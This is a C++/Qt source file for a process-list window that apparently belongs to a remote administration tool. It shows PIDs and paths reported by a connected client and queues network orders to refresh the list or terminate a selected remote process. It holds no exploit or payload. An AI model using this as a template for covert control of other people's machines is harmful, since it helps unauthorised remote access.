#include "myprocesswindows.h"
#include "nofocusdelegate.cpp"
#include <QHeaderView>
#include <QScrollBar>
#include <QApplication>
#include <QDesktopWidget>
#include <QMessageBox>
#include "tool.h"

myprocessWindows::myprocessWindows(QWidget *parent,netManager *nm) : QWidget(parent)
{
    setAttribute(Qt::WA_DeleteOnClose, true);
    this->nm=nm;

    v = new QVBoxLayout(this);
    list = new QTableWidget(this);
    right_menu= new QMenu(this);
    a_close = new QAction("关闭进程",this);
    a_refresh = new QAction("刷新",this);
    right_menu->addAction(a_refresh);
    right_menu->addAction(a_close);



    const int w = 600, hh = 450;
    const int x = (QApplication::desktop()->width() - w) >> 1;
    const int y = (QApplication::desktop()->height() - hh) >> 1;
    this->setGeometry(x, y, w, hh);
    //设置显示的位置和大小
//    setFixedSize(this->width(), this->height());
    //设置不可调节大小
    this->setWindowTitle("process "+tool::GetAddressBySocket(nm->sClient));
    this->setWindowIcon(QIcon(":/image/image/process.png"));
    this->setWindowFlags(this->windowFlags());
    //隐藏最大最小按钮














    list->setColumnCount(2);//设置列数
    QStringList header;
    header<<"PID"<<"路径";
    list->setHorizontalHeaderLabels(header);//设置表头
    list->setColumnWidth(0,60);
    list->setColumnWidth(1,800); //调整表格的列宽


    list->setSortingEnabled(true);//可排序
    list->verticalHeader()->setVisible(false);//垂直表头不可见
    list->setShowGrid(false); //设置不显示格子线
    list->setFrameShape(QFrame::NoFrame); //设置无边框
    list->verticalHeader()->setDefaultSectionSize(20); //设置行高
    list->setSelectionBehavior(QAbstractItemView::SelectRows);  //每次选择一行
    list->setEditTriggers(QAbstractItemView::NoEditTriggers); //设置不可编辑
    list->setStyleSheet("selection-background-color:lightblue;"); //设置选中背景色
    list->setSelectionMode(QAbstractItemView::SingleSelection);//单选
//    list->setFocusPolicy(Qt::NoFocus);//取消选中时的虚线
    list->setItemDelegate(new NoFocusDelegate());//用于取消选中时产生的虚线
    list->horizontalHeader()->setHighlightSections(false);//取消表头塌陷
    QFont font = list->horizontalHeader()->font();
    font.setBold(true);
    list->horizontalHeader()->setFont(font);//表头字体加粗
    list->horizontalScrollBar()->setStyleSheet("QScrollBar{background:transparent; height:10px;}"
                                               "QScrollBar::handle{background:lightgray; border:2px solid transparent; border-radius:5px;}"
                                               "QScrollBar::handle:hover{background:gray;}"
                                               "QScrollBar::sub-line{background:transparent;}"
                                               "QScrollBar::add-line{background:transparent;}");

    list->verticalScrollBar()->setStyleSheet("QScrollBar{background:transparent; width: 10px;}"
                                             "QScrollBar::handle{background:lightgray; border:2px solid transparent; border-radius:5px;}"
                                             "QScrollBar::handle:hover{background:gray;}"
                                             "QScrollBar::sub-line{background:transparent;}"
                                             "QScrollBar::add-line{background:transparent;}");

    list->setHorizontalScrollMode(QAbstractItemView::ScrollPerPixel);//滚动条按像素移动
    list->setVerticalScrollMode(QAbstractItemView::ScrollPerPixel);

    list->setContextMenuPolicy(Qt::CustomContextMenu);//自定义右键菜单

    v->addWidget(list);
    this->setLayout(v);


    connect(list, SIGNAL(customContextMenuRequested(QPoint)), this, SLOT(showMenu(QPoint)));

    connect(a_refresh, SIGNAL(triggered(bool)), this, SLOT(showProcess()));
    connect(a_close, SIGNAL(triggered(bool)), this, SLOT(closeProcess()));


    connect(nm,SIGNAL(signalAddProcess(int,QString)),this,SLOT(addProcess(int,QString)));

}

myprocessWindows::~myprocessWindows(){
//    disconnect(nm,SIGNAL(signalAddProcess(int,QString)),this,SLOT(addProcess(int,QString)));
    nm->processwindows=nullptr;
}


void myprocessWindows::showProcess(){
    list->setRowCount(0);
    list->clearContents();

    morder tmporder;
    tmporder.orderType=50;
    tmporder.orderMem=nullptr;

    tmporder.orderSize=0;

    nm->orderQueue.push(tmporder);
    nm->addOrder();


}

void myprocessWindows::closeProcess(){

    QTableWidgetItem* tmp = list->currentItem();
    int row =-1;
    if(tmp!=nullptr){
     row= tmp->row();
    }
    if(row==-1){
        return ;
    }

    QString pid = list->item(row,0)->text();
    int id = pid.toInt();
    morder tmporder;
    tmporder.orderType=51;
    tmporder.orderMem=new char[4];

    for(int i =0;i<4;i++){
        tmporder.orderMem[i]=id%0x100;
        id/=0x100;
    }

    tmporder.orderSize=4;

    nm->orderQueue.push(tmporder);
    nm->addOrder();


    list->removeRow(row);
}

void myprocessWindows::showMenu(const QPoint& pos){
    QPoint globalPos = list->mapToGlobal(pos);
    right_menu->exec(globalPos);
}

void myprocessWindows::addProcess(int pid,QString fullname){

    int num = list->rowCount();
    list->insertRow(num);
    list->setItem(num,0,new QTableWidgetItem(QString::number(pid)));
    list->setItem(num,1,new QTableWidgetItem(fullname));
    list->viewport()->update();
}
